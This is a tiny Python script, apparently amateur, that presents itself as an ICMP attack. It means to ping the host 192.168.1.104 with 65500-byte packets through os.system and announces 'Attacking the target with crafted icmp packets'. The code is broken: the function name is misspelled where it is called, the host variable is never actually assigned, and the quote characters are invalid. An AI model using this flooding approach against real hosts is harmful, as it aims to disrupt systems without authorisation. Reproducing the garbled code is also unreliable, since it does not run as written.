import os
import sys
import time

def icmp_startatack():
    hostip: “192.168.1.104”
    ippacketData = “65500”
    print “Attacking the target with crafted icmp packets”
    os.system(“ping ” + hostip + “ -l ” + ippacketData)
icmp_startattack()
print “attack finished”